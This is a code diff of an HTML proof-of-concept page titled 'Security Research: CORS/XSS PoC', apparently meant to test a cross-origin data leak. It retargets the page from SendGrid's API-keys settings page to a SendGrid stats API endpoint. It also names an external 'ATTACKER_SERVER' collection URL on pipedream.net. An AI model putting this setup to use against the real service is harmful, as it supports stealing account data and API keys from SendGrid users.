@@ -16,7 +16,7 @@
 
 <div class="card">
     <h1>Security Research: CORS/XSS PoC</h1>
-    <p><strong>Target URL:</strong> <code id="target-display">https://app.sendgrid.com/settings/api_keys?_gl=1*lc6inh*_gcl_au*MTY5NDc3NDA0LjE3NzcyMzE1NzQuNTUwNjU3NDc5LjE3NzcyNTY3MTYuMTc3NzI1NzAxMw..*_ga*NzgwOTQ0MjQyLjE3NzcyMzE1ODE.*_ga_8W5LR442LD*czE3NzczMTY5MzIkbzQkZzEkdDE3NzczMTc1NTAkajMzJGwwJGgw</code></p>
+    <p><strong>Target URL:</strong> <code id="target-display">https://api.sendgrid.com/v3/stats?aggregated_by=week&start_date=2023-05-27</code></p>
     <p><strong>Attacker Origin:</strong> <code id="attacker-display"></code></p>
     <hr>
     <div id="status-box" class="status">
@@ -25,7 +25,7 @@
 </div>
 
 <script>
-    const TARGET_API = "https://app.sendgrid.com/settings/api_keys?_gl=1*lc6inh*_gcl_au*MTY5NDc3NDA0LjE3NzcyMzE1NzQuNTUwNjU3NDc5LjE3NzcyNTY3MTYuMTc3NzI1NzAxMw..*_ga*NzgwOTQ0MjQyLjE3NzcyMzE1ODE.*_ga_8W5LR442LD*czE3NzczMTY5MzIkbzQkZzEkdDE3NzczMTc1NTAkajMzJGwwJGgw"; 
+    const TARGET_API = "https://api.sendgrid.com/v3/stats?aggregated_by=week&start_date=2023-05-27"; 
     const ATTACKER_SERVER = "https://eo95zv3v5okp4gx.m.pipedream.net"; 
 
     document.getElementById('attacker-display').innerText = window.location.origin;
